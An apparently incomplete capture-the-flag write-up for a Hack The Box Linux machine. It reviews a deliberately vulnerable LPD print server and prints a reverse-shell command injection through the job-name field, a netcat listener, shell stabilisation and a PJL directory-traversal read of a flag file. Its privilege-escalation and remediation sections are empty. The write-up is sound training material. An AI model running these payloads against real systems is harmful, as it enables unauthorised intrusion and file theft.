---
link: https://app.hackthebox.com/machines/Paperwork?sort_by=created_at&sort_type=desc
difficulty: Easy
os: Linux
pov: red
release date: 2026-07-11
tags:
  - SN_11
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1ee24ec-e2f1-4c61-88ca-9d7d4d296251-1780441937.png
solved:
solve date:
machine no.: 8
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Paperwork Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1ee24ec-e2f1-4c61-88ca-9d7d4d296251-1780441937.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): <a href="https://app.hackthebox.com/users/512308">LazyTitan33</a></p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Debrief


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Store the target address in a shell variable

**Command:**

```bash
IP=TARGET_IP
echo $IP
```

To clear the variable:

```bash
unset IP
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.3 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
4 packets transmitted, 4 received, 0% packet loss
rtt min/avg/max/mdev = 215.165/219.751/223.878/3.609 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.4 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 1.4.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`

**Breakdown:**

| Component         | Purpose             | Simple Explanation                                                                                                                                                                                                                                 |
| ----------------- | ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`            | Port scanner        | Sends packets to each port and classifies the response as open, closed, or filtered.                                                                                                                                                               |
| `-p-`             | Port range          | Shorthand for ports 1–65535. Without it nmap checks only its built-in list of 1000 common ports.                                                                                                                                                   |
| `--min-rate 5000` | Timing floor        | Forces at least 5000 packets per second instead of letting nmap's adaptive timing throttle down. This is what makes a full-range scan finish in seconds rather than minutes. Note the **double** dash.                                             |
| `-Pn`             | Skip host discovery | Treats the host as up without pinging first. HTB machines commonly drop ICMP; without this, nmap may conclude the host is down and scan nothing.                                                                                                   |
| `\| grapo`        | Custom filter       | Local zsh function: `tee /dev/tty \| grep -oP '^\d+(?=/tcp\s+open)' \| paste -sd, \| sed 's/^/\n/'`. Prints the full nmap output to the terminal while extracting open port numbers into a comma-separated list ready to paste into the next scan. |

**Result:**

```shell
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol
```

**What this gives you:** 

- Only three open ports. 
- **Key finding:** port **1515** is non-standard. Nmap's service guess (`ifor-protocol`) is just a best match for that port number, not a real identification, flagging it as the custom attack surface.

**Next:** Run targeted version and script detection against the three open ports.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.2 The "Deep Dive" Scan (Targeted Aggression)

Pin down software versions on the known-open ports and coax a banner out of the unidentified 1515 service.

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
22/tcp   open  ssh      OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (protocol 2.0)
80/tcp   open  http     nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
1515/tcp open  ifor-protocol?
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.3 Scan Results Analysis

| Port | Service           | Version                 | Analysis                                                                                                  | Simple Explanation                                                                                    |
| ---- | ----------------- | ----------------------- | --------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| 22   | SSH               | OpenSSH 10.0p2 (Ubuntu) | Current, patched; no version exploit. Becomes useful only as a login target once we hold a key.           | The front door — locked, and we can't pick it, but we may let ourselves in later with a key we plant. |
| 80   | HTTP              | nginx 1.28.0            | Redirects to `paperwork.htb`; a name-based vhost. Needs a hosts entry before it serves content.           | A website that only answers to its proper name, so we have to tell our machine that name first.       |
| 1515 | custom (LPD-like) | unidentified            | Returns `Archive_Printer is ready and printing.` on connect. Stateful, non-standard — the primary target. | A home-made "printer" service that chats back when you connect; this is the way in.                   |

**Key finding:** the web app is a name-based vhost (`paperwork.htb`) that must be added to `/etc/hosts`, and port 1515 is a bespoke print daemon that greets clients. The service we'll reverse and exploit for the foothold.

**Next:** Register the `paperwork.htb` vhost locally and request the site to read the intake portal.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Read the Intake Portal (port 80)

**Why this step:** Recon flagged a name-based vhost on nginx. With `paperwork.htb` registered in `/etc/hosts`, load the site to learn how the custom service on 1515 expects to be addressed.

**Primary method (browser):** Register the vhost, then browse to `http://paperwork.htb/`.

```bash
echo "TARGET_IP paperwork.htb" | sudo tee -a /etc/hosts
```

![[paperwork_intake_portal.png]]

**Alternative (curl):** Fetch the same content from the terminal.

```bash
curl -s http://paperwork.htb/
```

**Breakdown:**

- `echo "TARGET_IP paperwork.htb" | sudo tee -a /etc/hosts`: map the vhost name to the target so nginx serves the app instead of redirecting.
- `curl -s http://paperwork.htb/`: fetch the page body quietly, with `-s` suppressing the progress meter.

**What this gives you:** 

- Key finding: the service on 1515 speaks RFC 1179 (LPD), expects queue `archive_intake`, and demands a "valid identifier" on each job, which points at the control-file job-name field. The "Internal Processor" is a live hyperlink, a likely pointer to the service's source.

**Next:** Inspect the page's links to locate the processor source referenced by the portal.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Locate the processor source

**Why this step:** The intake portal rendered "Internal Processor" as a hyperlink. Inspecting its target reveals whether the application exposes the source of the service running on 1515.

**Primary method (browser):** Hover over the `paperwork-archive-v1.02` link on `http://paperwork.htb/` and read its target, or right-click and copy the link location.

**Alternative (curl):** Extract the link from the page source.

```bash
curl -s http://paperwork.htb/ | grep -iE 'href|src='
```

**Breakdown:**

- `curl -s http://paperwork.htb/`: fetch the homepage HTML.
- `grep -iE 'href|src='`: case-insensitively filter for lines containing link or resource references.

**Result:**

```html
<td><a href="/download/archive"><code>paperwork-archive-v1.02</code></a></td>
```

**What this gives you:**

- Key finding: the processor name links to `/download/archive`, a file-download endpoint that likely serves the source or binary of the 1515 service. This is the route to white-box analysis of the daemon.

**Next:** Download the file from `/download/archive` and identify its type before reading it.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.3 Retrieve and identify the source bundle

**Why this step:** The `/download/archive` endpoint referenced by the portal serves a file. Downloading and identifying it confirms whether the service source is exposed for review.

**Primary method (browser):** Navigate to `http://paperwork.htb/download/archive`; the browser saves the file into `~/Downloads`.

**Alternative (curl):**

```bash
curl -s http://paperwork.htb/download/archive -o paperwork-archive-v1.02.zip
file paperwork-archive-v1.02.zip
```

**Breakdown:**

- `curl -s ... -o paperwork-archive-v1.02.zip`: download the endpoint's content to a named file.
- `file ...`: identify the file type from its contents rather than trusting the extension.

**Result:**

```
paperwork-archive-v1.02.zip
```

The download is a ZIP archive named `paperwork-archive-v1.02.zip`.

**What this gives you:**

- Key finding: the application hands out the processor as a downloadable ZIP, enabling white-box source review of the service listening on port 1515.

**Next:** Extract the archive and enumerate its contents to locate the service source.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.4 Extract the source bundle

**Why this step:** The downloaded ZIP should contain the service source. Extracting it exposes the exact code handling connections on port 1515.

**Command:**

```bash
unzip paperwork-archive-v1.02.zip -d paperwork-archive
ls -laR paperwork-archive
```

**Breakdown:**

- `unzip paperwork-archive-v1.02.zip -d paperwork-archive`: extract the archive into a dedicated directory.
- `ls -laR paperwork-archive`: list the extracted tree recursively with permissions and sizes.

**Result:**

```
paperwork-archive:
-rw-r-xr-- 1 nedmoeca nedmoeca 2820 Mar 12  2026 server.py
```

**What this gives you:**

- Key finding: the bundle holds a single file, `server.py` (2820 bytes), the complete source of the LPD service on port 1515. Full white-box review is now possible.

**Next:** Read `server.py` and identify the queue-validation and job-handling logic.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.5 Source review of the LPD service (`server.py`)

**Why this step:** The extracted bundle contains the full source of the port 1515 daemon. Reading it identifies the exact weaknesses to target, turning this into a white-box attack.

**Command:**

```bash
cat paperwork-archive/server.py
```

**Result:**

```python
import socket
import threading
import subprocess
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            
            command = data[0]
            
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
                
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            
            subcommand = chunk[0]
            self.sock.send(b'\x00') 
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue
                
                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)
                
                decoded_content = content.decode(errors='ignore')
                
                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break
                
                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
                
                self.sock.send(b'\x00') 
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()
```

**Theory:**

- LPD command bytes: RFC 1179 starts every request with a single command byte. This service implements only a few: `0x02` ("receive a printer job") enters the job handler, while `0x03`/`0x04` ("send queue state") return a status string. That status path is why probing 1515 returns the "ready and printing" banner.
- The `in` operator flaw: in Python, when both operands are strings, `x in y` tests whether `x` is a substring of `y`, not whether they are equal. The author meant "is this the valid queue" but wrote "is this contained in the valid queue." An empty string is a substring of every string, so `"" in "archive_intake"` is `True`, and an empty queue name passes validation.
- Command injection via `shell=True`: the job name is interpolated into a shell string run with `shell=True`, so the shell parses the whole thing. Because the value lands inside single quotes (`echo 'Archive: <job_name>'`), closing the quote, injecting a command, and commenting out the trailing redirect (`'; <command>; #`) yields OS command execution as the service account. No input is escaped or validated.

**What this gives you:**

- Key finding 1: `queue not in VALID_QUEUE` is a substring check, so an empty queue name bypasses queue validation.
- Key finding 2: the `J` job-name line is interpolated into a `subprocess.Popen(..., shell=True)` call with no sanitization, giving OS command injection.
- Together these allow an unauthenticated client to reach the job handler and execute arbitrary commands as the service account.

**Next:** Craft the LPD control file and protocol handshake that combine the queue bypass with a reverse-shell injection in the job name.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation & Initial Access

### 3.1 Foothold as `lp` via LPD command injection

**Why this step:** The source review exposed an empty-queue bypass and a shell injection in the job-name field. Combining them in a single crafted LPD exchange yields remote code execution as the service account.

**Command (attacker):** Start a listener, then run the exploit.

```bash
nc -lvnp 4444          # terminal 1
python3 foothold.py    # terminal 2
```

**Exploit (`foothold.py`) breakdown:**

- `cmd = bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'`: the reverse-shell payload to execute on the target.
- `job = "'; {cmd}; #"`: closes the single quote in `echo 'Archive: ...'`, runs `cmd`, and comments out the trailing redirect so the shell line stays valid.
- `control = "Hlocalhost\nPtester\nJ{job}\n"`: an LPD control file; the `J` line is the one the server parses as the job name and feeds to the shell.
- `s.send(b"\x02\n")`: command byte `0x02` (receive job) with an empty queue name, satisfying the `"" in "archive_intake"` substring check.
- `header = b"\x02" + len(control) + b" cfA001localhost\n"`: subcommand `0x02` (receive control file) announcing the control-file size and name.
- `s.send(control)`: delivers the malicious control file, triggering `subprocess.Popen(..., shell=True)` on the target.

**Result (attacker listener):**

```
listening on [any] 4444 ...
connect to [10.10.14.68] from (UNKNOWN) [TARGET_IP] 36362
bash: cannot set terminal process group (989): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$
```

Script output confirmed both protocol ACKs:

```
[*] header ACK: b'\x00'
[*] final ACK: b'\x00'
[+] Payload sent, check your listener
```

**What this gives you:**

- Key finding: unauthenticated remote code execution on Paperwork as the `lp` user, landing in `/opt/LPDServer`, the service's working directory.
- Both source-review findings are confirmed live: the empty-queue substring bypass and the unsanitized job-name command injection.

**Next:** Stabilize the shell, confirm the user context, and enumerate internal services for the lateral-movement path.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Stabilize the shell and confirm context

**Why this step:** The reverse shell is a raw, non-interactive bash session. Upgrading it to a PTY makes enumeration reliable, and confirming the user context sets the target for lateral movement.

**Command (on target):**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z, then on attacker: stty raw -echo; fg , press Enter twice
id ; hostname
```

**Breakdown:**

- `python3 -c 'import pty;pty.spawn("/bin/bash")'`: spawns a pseudo-terminal so the shell supports job control, tab completion, and full-screen tools.
- `Ctrl-Z` then `stty raw -echo; fg`: backgrounds the shell, puts the local terminal in raw mode so keystrokes pass through, and resumes it.
- `id ; hostname`: report the current user, groups, and machine name.

**Result:**

```
uid=7(lp) gid=7(lp) groups=7(lp)
paperwork
```

**What this gives you:**

- Key finding: the foothold runs as the unprivileged `lp` service account (uid 7) with no extra groups, so privilege will have to come from an internal service, not this user's rights.
- Confirmed execution on host `paperwork` directly.

**Next:** Enumerate internal listeners to locate the JetDirect/PJL service used for lateral movement.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Lateral Movement

#### 4.1 Enumerate internal listeners

**Why this step:** The foothold as `lp` has no useful privileges, so escalation must come from a service. External nmap only saw 22, 80, and 1515; internal, loopback-bound services are visible only from on the host.

**Command (on target):**

```bash
ss -tlnp
```

**Breakdown:**

- `ss`: socket statistics utility.
- `-t`: TCP sockets only.
- `-l`: listening sockets only.
- `-n`: numeric ports and addresses, no name resolution.
- `-p`: show the owning process where permitted.

**Result:**

```
State  Local Address:Port   Process
LISTEN 0.0.0.0:22
LISTEN 0.0.0.0:80
LISTEN 127.0.0.1:9100
LISTEN 127.0.0.54:53
LISTEN 127.0.0.1:1337
LISTEN 127.0.0.53%lo:53
LISTEN 0.0.0.0:1515       users:(("python3",pid=989,fd=3))
LISTEN [::]:22
```

|Port|Bind|Service|Analysis|Simple Explanation|
|---|---|---|---|---|
|9100|127.0.0.1|JetDirect/PJL|Internal-only raw print port. Target for lateral movement via PJL traversal.|A hidden printer service only the box can talk to; the way to the next user.|
|1337|127.0.0.1|unknown|Deliberate decoy; does not lead to `archivist`.|A dead-end trap, safe to ignore.|
|1515|0.0.0.0|custom LPD (python3, pid 989)|The service already exploited for the foothold.|The home-made printer we broke into with.|
|53|127.0.0.53/54|systemd-resolved|Local DNS stub resolver, not relevant.|The machine's own address-lookup helper.|
|22|0.0.0.0 / ::|SSH|Login target once a key or credential is obtained.|The front door, usable later with a key.|

**What this gives you:**

- Key finding: `127.0.0.1:9100` exposes an internal JetDirect/PJL service reachable only from the host, the pivot point to the `archivist` user.
- The `127.0.0.1:1337` listener is a red herring and is excluded from the path.

**Next:** Interact with the PJL service on 9100 and exploit directory traversal via `FSUPLOAD` to read `user.txt`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Read `user.txt` via PJL directory traversal (`FSUPLOAD`)

**Why this step:** Internal enumeration found a JetDirect/PJL service on `127.0.0.1:9100`. PJL exposes a filesystem interface; testing it with a traversal path both proves the vulnerability and retrieves the user flag.

**Command (on target, via Python since `nc` is absent):**

```bash
python3 -c '
import socket
s=socket.socket()
s.connect(("127.0.0.1",9100))
s.send(b"@PJL FSUPLOAD NAME=\"../../../../home/archivist/user.txt\"\n")
print(s.recv(4096).decode(errors="ignore"))
s.close()
'
```

**Breakdown:**

- `socket.connect(("127.0.0.1",9100))`: open a raw TCP connection to the loopback PJL service.
- `@PJL FSUPLOAD NAME="..."`: PJL command that uploads (reads back) a file from the device filesystem to the client.
- `../../../../`: directory traversal escaping the printer's virtual filesystem root to the host root.
- `home/archivist/user.txt`: the target file, unreadable by `lp` directly.

**Result:**

```
@PJL FSUPLOAD NAME="../../../../home/archivist/user.txt" SIZE=33
5481d28c73af2c2697456a2dc9296d7d
```

**What this gives you:**

- Key finding: the PJL `FSUPLOAD` command is vulnerable to directory traversal, granting arbitrary file read as the `archivist`-owned (or higher) service context.
- Retrieved `user.txt`, confirming the read primitive before weaponizing the matching write primitive.

**Next:** Use the PJL `FSDOWNLOAD` command to write an attacker SSH public key into `archivist`'s `authorized_keys`, then log in over SSH.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

